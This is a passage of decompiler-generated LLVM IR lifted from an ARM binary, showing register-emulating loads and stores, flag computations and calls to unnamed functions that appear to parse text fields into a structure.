  store i8 %v1_8f3c, i8* %v5_8f3c, align 1
  %v0_8f40 = load i32, i32* @r6, align 4
  store i32 %v0_8f40, i32* %r0.global-to-local, align 4
  %v1_8f44 = inttoptr i32 %v0_8f40 to i8*
  %v2_8f44 = call i32 @function_124dc(i8* %v1_8f44)
  %v0_8f48 = load i32, i32* @r5, align 4
  store i32 %v0_8f48, i32* %r1.global-to-local, align 4
  store i32 %v2_8f44, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_8f54 = inttoptr i32 %v0_8f48 to i32*
  %v3_8f54 = call i32 @function_11b24(i32 43, i32* %v2_8f54)
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* @r1, align 4
  store i32 %v3_8f54, i32* %r2.global-to-local, align 4
  %v0_8f60 = load i32, i32* @r6, align 4
  store i32 %v0_8f60, i32* %r0.global-to-local, align 4
  %v3_8f64 = inttoptr i32 %v0_8f60 to i8*
  %v4_8f64 = call i32 @function_12830(i8* %v3_8f64, i32 %v0_8f58, i32 %v3_8f54)
  store i32 %v4_8f64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8f68 = icmp slt i32 %v4_8f64, 0
  store i1 %v1_8f68, i1* %cpsr_n.global-to-local, align 1
  %v2_8f68 = icmp eq i32 %v4_8f64, 0
  store i1 %v2_8f68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f68, label %.thread47, label %bb215

bb215:                                            ; preds = %bb214
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_8f70 = load i32, i32* @r8, align 4
  %v3_8f70 = inttoptr i32 %v2_8f70 to i32*
  store i32 1, i32* %v3_8f70, align 4
  br label %.thread47

.thread47:                                        ; preds = %bb214, %dec_label_pc_8ec0, %.thread46, %bb215
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_8f80 = load i32, i32* @r8, align 4
  %v2_8f80 = add i32 %v1_8f80, 4
  %v3_8f80 = inttoptr i32 %v2_8f80 to i32*
  store i32 0, i32* %v3_8f80, align 4
  %v3_8f84 = call i32 @function_11b24(i32 41, i32* null)
  %v0_8f88 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8f88, i32* @r1, align 4
  store i32 %v3_8f84, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8f94 = call i32 @function_12830(i8* %tmp199, i32 %v0_8f88, i32 %v3_8f84)
  store i32 %v4_8f94, i32* %r0.global-to-local, align 4
  %v1_8f9c = add i32 %v4_8f94, 1
  %v2_8f9c = icmp eq i32 %v4_8f94, -1
  store i1 %v2_8f9c, i1* %cpsr_c.global-to-local, align 1
  %v3_8f9c = sub i32 0, %v4_8f94
  %v4_8f9c = and i32 %v1_8f9c, %v3_8f9c
  %v5_8f9c = icmp slt i32 %v4_8f9c, 0
  store i1 %v5_8f9c, i1* %cpsr_v.global-to-local, align 1
  %v6_8f9c = icmp slt i32 %v1_8f9c, 0
  store i1 %v6_8f9c, i1* %cpsr_n.global-to-local, align 1
  %v7_8f9c = icmp eq i32 %v1_8f9c, 0
  store i1 %v7_8f9c, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_8f9c, label %.thread48, label %dec_label_pc_8fa8

dec_label_pc_8fa8:                                ; preds = %.thread47
  %v0_8fa8 = load i32, i32* @r6, align 4
  store i32 %v0_8fa8, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_8fb0 = inttoptr i32 %v0_8fa8 to i32*
  %v3_8fb0 = call i32 @function_11b24(i32 41, i32* %v2_8fb0)
  %v0_8fb4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8fb4, i32* @r1, align 4
  store i32 %v3_8fb0, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8fc0 = call i32 @function_12830(i8* %tmp199, i32 %v0_8fb4, i32 %v3_8fb0)
  store i32 %v4_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_8fcc = add i32 %v4_8fc0, %v2_8748
  store i32 %v2_8fcc, i32* %r3.global-to-local, align 4
  %v1_8fd0 = load i32, i32* @r5, align 4
  %v2_8fd0 = add i32 %v1_8fd0, %v2_8fcc
  %v3_8fd0 = inttoptr i32 %v2_8fd0 to i8*
  %v4_8fd0 = load i8, i8* %v3_8fd0, align 1
  %v2_8fd8 = icmp ugt i8 %v4_8fd0, 31
  store i1 %v2_8fd8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8fd8 = icmp ult i8 %v4_8fd0, 32
  store i1 %v6_8fd8, i1* %cpsr_n.global-to-local, align 1
  %v7_8fd8 = icmp eq i8 %v4_8fd0, 32
  store i1 %v7_8fd8, i1* %cpsr_z.global-to-local, align 1
  %v2_8fe0 = zext i1 %v7_8fd8 to i32
  %v2_8fe0.v4_8fc0 = add i32 %v2_8fe0, %v4_8fc0
  store i32 %v2_8fe0.v4_8fc0, i32* @r4, align 4
  %v2_8fe4 = add i32 %v2_8fe0.v4_8fc0, %v2_8280
  store i32 %v2_8fe4, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8fe4, i32* %r0.global-to-local, align 4
  %v1_8ff0 = load i32, i32* %fp.global-to-local, align 4
  %v2_8ff0 = sub i32 %v1_8ff0, %v2_8fe0.v4_8fc0
  store i32 %v2_8ff0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8ff8 = call i32 @function_125a0(i32 %v2_8fe4, i32 %v2_8ff0, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32 2)
  store i32 %v5_8ff8, i32* %r0.global-to-local, align 4
  %v1_8ffc = add i32 %v5_8ff8, 1
  %v2_8ffc = icmp eq i32 %v5_8ff8, -1
  store i1 %v2_8ffc, i1* %cpsr_c.global-to-local, align 1
  %v3_8ffc = sub i32 0, %v5_8ff8
  %v4_8ffc = and i32 %v1_8ffc, %v3_8ffc
  %v5_8ffc = icmp slt i32 %v4_8ffc, 0
  store i1 %v5_8ffc, i1* %cpsr_v.global-to-local, align 1
  %v6_8ffc = icmp slt i32 %v1_8ffc, 0
  store i1 %v6_8ffc, i1* %cpsr_n.global-to-local, align 1
  %v7_8ffc = icmp eq i32 %v1_8ffc, 0
  store i1 %v7_8ffc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_8ff8, i32* %r2.global-to-local, align 4
  br i1 %v7_8ffc, label %.thread48, label %dec_label_pc_9008

dec_label_pc_9008:                                ; preds = %dec_label_pc_8fa8
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_9010 = load i32, i32* @r4, align 4
  %v2_9010 = add i32 %v1_9010, %v2_8748
  %v1_9014 = add i32 %v5_8ff8, -1
  %v2_9014 = icmp ne i32 %v5_8ff8, 0
  store i1 %v2_9014, i1* %cpsr_c.global-to-local, align 1
  %v3_9014 = sub i32 0, %v5_8ff8
  %v4_9014 = and i32 %v5_8ff8, %v3_9014
  %v5_9014 = icmp slt i32 %v4_9014, 0
  store i1 %v5_9014, i1* %cpsr_v.global-to-local, align 1
  %v6_9014 = icmp slt i32 %v1_9014, 0
  store i1 %v6_9014, i1* %cpsr_n.global-to-local, align 1
  %v7_9014 = icmp eq i32 %v5_8ff8, 1
  store i1 %v7_9014, i1* %cpsr_z.global-to-local, align 1
  %v1_9018 = add i32 %v2_9010, -20736
  store i32 %v1_9018, i32* %r3.global-to-local, align 4
  %v7_901c = icmp sgt i32 %v5_8ff8, 1
  br i1 %v7_901c, label %bb216, label %bb217

bb216:                                            ; preds = %dec_label_pc_9008
  %v9_901c = add i32 %v5_8ff8, -2
  store i32 %v9_901c, i32* %r2.global-to-local, align 4
  br label %bb217

bb217:                                            ; preds = %dec_label_pc_9008, %bb216
  %v3_9024 = phi i32 [ %v5_8ff8, %dec_label_pc_9008 ], [ %v9_901c, %bb216 ]
  %v1_9020 = add i32 %v2_9010, -20773
  store i32 %v1_9020, i32* %r3.global-to-local, align 4
  %v0_9024 = load i32, i32* @r6, align 4
  %v1_9024 = trunc i32 %v0_9024 to i8
  %v4_9024 = add i32 %v3_9024, %v1_9020
  %v5_9024 = inttoptr i32 %v4_9024 to i8*
  store i8 %v1_9024, i8* %v5_9024, align 1
  %v0_9028 = load i32, i32* @r5, align 4
  store i32 %v0_9028, i32* %r0.global-to-local, align 4
  %v1_902c = inttoptr i32 %v0_9028 to i8*
  %v2_902c = call i32 @function_124dc(i8* %v1_902c)
  %v0_9030 = load i32, i32* @r6, align 4
  store i32 %v0_9030, i32* %r1.global-to-local, align 4
  store i32 %v2_902c, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_903c = inttoptr i32 %v0_9030 to i32*
  %v3_903c = call i32 @function_11b24(i32 42, i32* %v2_903c)
  %v0_9040 = load i32, i32* @r4, align 4
  store i32 %v0_9040, i32* @r1, align 4
  store i32 %v3_903c, i32* %r2.global-to-local, align 4
  %v0_9048 = load i32, i32* @r5, align 4
  store i32 %v0_9048, i32* %r0.global-to-local, align 4
  %v3_904c = inttoptr i32 %v0_9048 to i8*
  %v4_904c = call i32 @function_12830(i8* %v3_904c, i32 %v0_9040, i32 %v3_903c)
  store i32 %v4_904c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9050 = icmp slt i32 %v4_904c, 0
  store i1 %v1_9050, i1* %cpsr_n.global-to-local, align 1
  %v2_9050 = icmp eq i32 %v4_904c, 0
  store i1 %v2_9050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9050, label %.thread48, label %bb218

bb218:                                            ; preds = %bb217
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9058 = load i32, i32* @r8, align 4
  %v3_9058 = add i32 %v2_9058, 4
  %v4_9058 = inttoptr i32 %v3_9058 to i32*
  store i32 1, i32* %v4_9058, align 4
  br label %.thread48

.thread48:                                        ; preds = %bb217, %dec_label_pc_8fa8, %.thread47, %bb218
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9064 = call i32 @function_11b24(i32 40, i32* null)
  %v0_9068 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9068, i32* @r1, align 4
  store i32 %v3_9064, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9074 = call i32 @function_12830(i8* %tmp199, i32 %v0_9068, i32 %v3_9064)
  store i32 %v4_9074, i32* %r0.global-to-local, align 4
  %v1_9078 = add i32 %v4_9074, 1
  %v2_9078 = icmp eq i32 %v4_9074, -1
  store i1 %v2_9078, i1* %cpsr_c.global-to-local, align 1
  %v3_9078 = sub i32 0, %v4_9074
  %v4_9078 = and i32 %v1_9078, %v3_9078
  %v5_9078 = icmp slt i32 %v4_9078, 0
  store i1 %v5_9078, i1* %cpsr_v.global-to-local, align 1
  %v6_9078 = icmp slt i32 %v1_9078, 0
  store i1 %v6_9078, i1* %cpsr_n.global-to-local, align 1
  %v7_9078 = icmp eq i32 %v1_9078, 0
  store i1 %v7_9078, i1* %cpsr_z.global-to-local, align 1
  store i32 -20737, i32* %r5.global-to-local, align 4
  br i1 %v7_9078, label %.thread, label %dec_label_pc_9090

.thread:                                          ; preds = %.thread48
  store i32 -20773, i32* %r5.global-to-local, align 4
  %v2_9088 = load i32, i32* @r8, align 4
  %v3_9088 = add i32 %v2_9088, 8
  %v4_9088 = inttoptr i32 %v3_9088 to i32*
  store i32 0, i32* %v4_9088, align 4
  br label %dec_label_pc_9124

dec_label_pc_9090:                                ; preds = %.thread48
  store i32 -20773, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9098 = call i32 @function_11b24(i32 40, i32* null)
  %v0_909c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_909c, i32* @r1, align 4
  store i32 %v3_9098, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_90a8 = call i32 @function_12830(i8* %tmp199, i32 %v0_909c, i32 %v3_9098)
  store i32 %v4_90a8, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_90b4 = add i32 %v4_90a8, %v2_8748
  store i32 %v2_90b4, i32* %r3.global-to-local, align 4
  %v1_90b8 = load i32, i32* @r5, align 4
  %v2_90b8 = add i32 %v1_90b8, %v2_90b4
  %v3_90b8 = inttoptr i32 %v2_90b8 to i8*
  %v4_90b8 = load i8, i8* %v3_90b8, align 1
  %v2_90c0 = icmp ugt i8 %v4_90b8, 31
  store i1 %v2_90c0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_90c0 = icmp ult i8 %v4_90b8, 32
  store i1 %v6_90c0, i1* %cpsr_n.global-to-local, align 1
  %v7_90c0 = icmp eq i8 %v4_90b8, 32
  store i1 %v7_90c0, i1* %cpsr_z.global-to-local, align 1
  %v2_90c8 = zext i1 %v7_90c0 to i32
  %v2_90c8.v4_90a8 = add i32 %v2_90c8, %v4_90a8
  store i32 %v2_90c8.v4_90a8, i32* @r4, align 4
  %v2_90cc = add i32 %v2_90c8.v4_90a8, %v2_8280
  store i32 %v2_90cc, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_90cc, i32* %r0.global-to-local, align 4
  %v1_90d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_90d8 = sub i32 %v1_90d8, %v2_90c8.v4_90a8
  store i32 %v2_90d8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_90e0 = call i32 @function_125a0(i32 %v2_90cc, i32 %v2_90d8, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32 2)
  store i32 %v5_90e0, i32* %r0.global-to-local, align 4
  %v1_90e4 = add i32 %v5_90e0, 1
  %v2_90e4 = icmp eq i32 %v5_90e0, -1
  store i1 %v2_90e4, i1* %cpsr_c.global-to-local, align 1
  %v3_90e4 = sub i32 0, %v5_90e0
  %v4_90e4 = and i32 %v1_90e4, %v3_90e4
  %v5_90e4 = icmp slt i32 %v4_90e4, 0
  store i1 %v5_90e4, i1* %cpsr_v.global-to-local, align 1
  %v6_90e4 = icmp slt i32 %v1_90e4, 0
  store i1 %v6_90e4, i1* %cpsr_n.global-to-local, align 1
  %v7_90e4 = icmp eq i32 %v1_90e4, 0
  store i1 %v7_90e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_90e0, i32* %r2.global-to-local, align 4
  br i1 %v7_90e4, label %dec_label_pc_9124, label %dec_label_pc_90f0

dec_label_pc_90f0:                                ; preds = %dec_label_pc_9090
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_90f8 = load i32, i32* @r4, align 4
  %v2_90f8 = add i32 %v1_90f8, %v2_8748
  %v1_90fc = add i32 %v5_90e0, -1
  %v2_90fc = icmp ne i32 %v5_90e0, 0
  store i1 %v2_90fc, i1* %cpsr_c.global-to-local, align 1
  %v3_90fc = sub i32 0, %v5_90e0
  %v4_90fc = and i32 %v5_90e0, %v3_90fc
  %v5_90fc = icmp slt i32 %v4_90fc, 0
  store i1 %v5_90fc, i1* %cpsr_v.global-to-local, align 1
  %v6_90fc = icmp slt i32 %v1_90fc, 0
  store i1 %v6_90fc, i1* %cpsr_n.global-to-local, align 1
  %v7_90fc = icmp eq i32 %v5_90e0, 1
  store i1 %v7_90fc, i1* %cpsr_z.global-to-local, align 1
  %v1_9100 = add i32 %v2_90f8, -20736
  store i32 %v1_9100, i32* %r3.global-to-local, align 4
  %v7_9104 = icmp sgt i32 %v5_90e0, 1
  br i1 %v7_9104, label %bb219, label %bb220

bb219:                                            ; preds = %dec_label_pc_90f0
  %v9_9104 = add i32 %v5_90e0, -2
  store i32 %v9_9104, i32* %r2.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_90f0, %bb219
  %v3_9118 = phi i32 [ %v5_90e0, %dec_label_pc_90f0 ], [ %v9_9104, %bb219 ]
  %v1_9108 = add i32 %v2_90f8, -20773
  store i32 %v1_9108, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v0_9110 = load i32, i32* @r5, align 4
  store i32 %v0_9110, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v4_9118 = add i32 %v3_9118, %v1_9108
  %v5_9118 = inttoptr i32 %v4_9118 to i8*
  store i8 0, i8* %v5_9118, align 1
  %v2_911c = inttoptr i32 %v0_9110 to i8*
  %v3_911c = call i32 @function_12608(i8* %v2_911c, i32 10)
  store i32 %v3_911c, i32* %r0.global-to-local, align 4
  %v1_9120 = load i32, i32* @r8, align 4
  %v2_9120 = add i32 %v1_9120, 8
  %v3_9120 = inttoptr i32 %v2_9120 to i32*
  store i32 %v3_911c, i32* %v3_9120, align 4
  br label %dec_label_pc_9124

dec_label_pc_9124:                                ; preds = %.thread, %dec_label_pc_9090, %bb220
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9128

dec_label_pc_9128:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_927c, %dec_label_pc_9124
  %v1_9134 = phi i32 [ 0, %dec_label_pc_9124 ], [ %v0_927c, %dec_label_pc_927c ], [ %v1_9134.pre.pre, %dec_label_pc_92fc ]
  store i32 %v2_8280, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_9134 = add i32 %v1_9134, %v2_8280
  store i32 %v2_9134, i32* @r4, align 4
  %v3_9138 = call i32 @function_11b24(i32 39, i32* null)
  %v0_913c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_913c, i32* @r1, align 4
  store i32 %v3_9138, i32* %r2.global-to-local, align 4
  %v0_9144 = load i32, i32* @r4, align 4
  store i32 %v0_9144, i32* %r0.global-to-local, align 4
  %v3_9148 = inttoptr i32 %v0_9144 to i8*
  %v4_9148 = call i32 @function_12830(i8* %v3_9148, i32 %v0_913c, i32 %v3_9138)
  store i32 %v4_9148, i32* %r0.global-to-local, align 4
  %v1_9150 = add i32 %v4_9148, 1
  %v2_9150 = icmp eq i32 %v4_9148, -1
  store i1 %v2_9150, i1* %cpsr_c.global-to-local, align 1
  %v3_9150 = sub i32 0, %v4_9148
  %v4_9150 = and i32 %v1_9150, %v3_9150
  %v5_9150 = icmp slt i32 %v4_9150, 0
  store i1 %v5_9150, i1* %cpsr_v.global-to-local, align 1
  %v6_9150 = icmp slt i32 %v1_9150, 0
  store i1 %v6_9150, i1* %cpsr_n.global-to-local, align 1
  %v7_9150 = icmp eq i32 %v1_9150, 0
  store i1 %v7_9150, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9150, label %dec_label_pc_9328, label %dec_label_pc_915c

dec_label_pc_915c:                                ; preds = %dec_label_pc_9128
  %v0_915c = load i32, i32* @r8, align 4
  %v1_915c = add i32 %v0_915c, 12
  %v2_915c = inttoptr i32 %v1_915c to i32*
  %v3_915c = load i32, i32* %v2_915c, align 4
  store i32 %v3_915c, i32* %r3.global-to-local, align 4
  %v1_9160 = add i32 %v3_915c, -4
  %v2_9160 = icmp ugt i32 %v3_915c, 3
  store i1 %v2_9160, i1* %cpsr_c.global-to-local, align 1
  %v3_9160 = sub i32 3, %v3_915c
  %v4_9160 = and i32 %v3_9160, %v3_915c
  %v5_9160 = icmp slt i32 %v4_9160, 0
  store i1 %v5_9160, i1* %cpsr_v.global-to-local, align 1
  %v6_9160 = icmp slt i32 %v1_9160, 0
  store i1 %v6_9160, i1* %cpsr_n.global-to-local, align 1
  %v7_9160 = icmp eq i32 %v3_915c, 4
  store i1 %v7_9160, i1* %cpsr_z.global-to-local, align 1
  %v8_9164 = icmp sgt i32 %v3_915c, 4
  br i1 %v8_9164, label %dec_label_pc_9328, label %dec_label_pc_9168

dec_label_pc_9168:                                ; preds = %dec_label_pc_915c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_9170 = call i32 @function_11b24(i32 39, i32* null)
  %v0_9174 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9174, i32* @r1, align 4
  store i32 %v3_9170, i32* %r2.global-to-local, align 4
  %v0_917c = load i32, i32* @r4, align 4
  store i32 %v0_917c, i32* %r0.global-to-local, align 4
  %v3_9180 = inttoptr i32 %v0_917c to i8*
  %v4_9180 = call i32 @function_12830(i8* %v3_9180, i32 %v0_9174, i32 %v3_9170)
  store i32 %v4_9180, i32* %r0.global-to-local, align 4
  %v0_9188 = load i32, i32* @r5, align 4
  %v2_9188 = add i32 %v0_9188, %v4_9180
  store i32 %v2_9188, i32* @sl, align 4
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  %v2_9190 = add i32 %v2_9188, %v2_8748
  store i32 %v2_9190, i32* %r3.global-to-local, align 4
  %v1_9194 = load i32, i32* @r6, align 4
  %v2_9194 = add i32 %v1_9194, %v2_9190
  %v3_9194 = inttoptr i32 %v2_9194 to i8*
  %v4_9194 = load i8, i8* %v3_9194, align 1
  %v6_9194 = zext i8 %v4_9194 to i32
  store i32 %v6_9194, i32* %r2.global-to-local, align 4
  %v2_9198 = icmp ugt i8 %v4_9194, 31
  store i1 %v2_9198, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9198 = icmp ult i8 %v4_9194, 32
  store i1 %v6_9198, i1* %cpsr_n.global-to-local, align 1
  %v7_9198 = icmp eq i8 %v4_9194, 32
  store i1 %v7_9198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9198, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_9168
  %v2_919c = add i32 %v4_9180, 1
  store i32 %v2_919c, i32* %r0.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_9168, %bb221
  %v2_91ac = phi i32 [ %v4_9180, %dec_label_pc_9168 ], [ %v2_919c, %bb221 ]
  %v1_91a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_91a0 = sub i32 %v1_91a0, %v0_9188
  store i32 %v2_91a0, i32* %r3.global-to-local, align 4
  %v2_91a4 = sub i32 %v2_91a0, %v2_91ac
  store i32 %v2_91a4, i32* @r7, align 4
  %v0_91a8 = load i32, i32* @r4, align 4
  %v2_91a8 = add i32 %v0_91a8, %v2_91ac
  store i32 %v2_91a8, i32* @r6, align 4
  br i1 %v7_9198, label %bb223, label %bb224

bb223:                                            ; preds = %bb222
  %v3_91ac = add i32 %v2_91ac, %v0_9188
  store i32 %v3_91ac, i32* @sl, align 4
  br label %bb224

bb224:                                            ; preds = %bb222, %bb223
  store i32 %v2_91a4, i32* %r1.global-to-local, align 4
  store i32 %v2_91a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_91c0 = call i32 @function_125a0(i32 %v2_91a8, i32 %v2_91a4, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32 2)
  store i32 %v5_91c0, i32* %r0.global-to-local, align 4
  %v1_91c4 = add i32 %v5_91c0, 1
  %v2_91c4 = icmp eq i32 %v5_91c0, -1
  store i1 %v2_91c4, i1* %cpsr_c.global-to-local, align 1
  %v3_91c4 = sub i32 0, %v5_91c0
  %v4_91c4 = and i32 %v1_91c4, %v3_91c4
  %v5_91c4 = icmp slt i32 %v4_91c4, 0
  store i1 %v5_91c4, i1* %cpsr_v.global-to-local, align 1
  %v6_91c4 = icmp slt i32 %v1_91c4, 0
  store i1 %v6_91c4, i1* %cpsr_n.global-to-local, align 1
  %v7_91c4 = icmp eq i32 %v1_91c4, 0
  store i1 %v7_91c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_91c0, i32* @r4, align 4
  br i1 %v7_91c4, label %dec_label_pc_927c, label %dec_label_pc_91d0

dec_label_pc_91d0:                                ; preds = %bb224
  store i32 %v2_8280, i32* %r2.global-to-local, align 4
  %v1_91d4 = add i32 %v5_91c0, -1
  %v2_91d4 = icmp ne i32 %v5_91c0, 0
  store i1 %v2_91d4, i1* %cpsr_c.global-to-local, align 1
  %v3_91d4 = sub i32 0, %v5_91c0
  %v4_91d4 = and i32 %v5_91c0, %v3_91d4
  %v5_91d4 = icmp slt i32 %v4_91d4, 0
  store i1 %v5_91d4, i1* %cpsr_v.global-to-local, align 1
  %v6_91d4 = icmp slt i32 %v1_91d4, 0
  store i1 %v6_91d4, i1* %cpsr_n.global-to-local, align 1
  %v7_91d4 = icmp eq i32 %v5_91c0, 1
  store i1 %v7_91d4, i1* %cpsr_z.global-to-local, align 1
  %v7_91d8 = icmp slt i32 %v5_91c0, 2
  br i1 %v7_91d8, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_91d0
  %v9_91d8 = add i32 %v5_91c0, -2
  store i32 %v9_91d8, i32* @r4, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_91d0, %bb225
  %v1_91dc = load i32, i32* @sl, align 4
  %v2_91dc = add i32 %v1_91dc, %v2_8280
  store i32 %v2_91dc, i32* @r5, align 4
  %v0_91e0 = load i32, i32* @r6, align 4
  store i32 %v0_91e0, i32* %r0.global-to-local, align 4
  %v0_91e4 = load i32, i32* @r7, align 4
  store i32 %v0_91e4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1577c.42 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_91f0 = call i32 @function_125a0(i32 %v0_91e0, i32 %v0_91e4, i32 ptrtoint (i32* @global_var_1577c.42 to i32), i32 1)
  store i32 %v4_91f0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_91f4 = icmp slt i32 %v4_91f0, 0
  store i1 %v1_91f4, i1* %cpsr_n.global-to-local, align 1
  %v2_91f4 = icmp eq i32 %v4_91f0, 0
  store i1 %v2_91f4, i1* %cpsr_z.global-to-local, align 1
  %tmp227 = icmp slt i32 %v4_91f0, 1
  br i1 %tmp227, label %.dec_label_pc_9214_crit_edge, label %dec_label_pc_91fc

.dec_label_pc_9214_crit_edge:                     ; preds = %bb226
  %v1_921c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9214

dec_label_pc_91fc:                                ; preds = %bb226
  %v0_91fc = load i32, i32* @r6, align 4
  store i32 %v0_91fc, i32* %r0.global-to-local, align 4
  %v0_9200 = load i32, i32* @r7, align 4
  store i32 %v0_9200, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1577c.42 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_920c = call i32 @function_125a0(i32 %v0_91fc, i32 %v0_9200, i32 ptrtoint (i32* @global_var_1577c.42 to i32), i32 1)
  store i32 %v4_920c, i32* %r0.global-to-local, align 4
  %v1_9210 = add i32 %v4_920c, -1
  store i32 %v1_9210, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %.dec_label_pc_9214_crit_edge, %dec_label_pc_91fc
  %v1_921c = phi i32 [ %v1_921c.pre, %.dec_label_pc_9214_crit_edge ], [ %v1_9210, %dec_label_pc_91fc ]
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_9224 = add i32 %v2_921c, %v1_921c
  store i32 %v1_9224, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9234 = load i32, i32* @sl, align 4
  %v4_9234 = add i32 %v3_9234, %v1_9224
  %v5_9234 = inttoptr i32 %v4_9234 to i8*
  store i8 0, i8* %v5_9234, align 1
  %storemerge4.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9254.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9254

dec_label_pc_9240:                                ; preds = %dec_label_pc_9254
  br i1 %v7_9244, label %dec_label_pc_9284, label %dec_label_pc_924c

dec_label_pc_924c:                                ; preds = %dec_label_pc_9240
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9254

dec_label_pc_9254:                                ; preds = %dec_label_pc_9214, %dec_label_pc_924c
  %v0_9254 = phi i32 [ %v0_9240, %dec_label_pc_924c ], [ %v0_9254.pre, %dec_label_pc_9214 ]
  %storemerge4 = phi i32 [ %v1_9268, %dec_label_pc_924c ], [ %storemerge4.pre, %dec_label_pc_9214 ]
  store i32 %storemerge4, i32* %stack_var_-40, align 4
  store i32 %v0_9254, i32* %r0.global-to-local, align 4
  %v1_9258 = inttoptr i32 %v0_9254 to i8*
  %v2_9258 = call i32 @function_124dc(i8* %v1_9258)
  store i32 %v2_9258, i32* %r0.global-to-local, align 4
  %v3_9260 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9260, i32* %r4.global-to-local, align 4
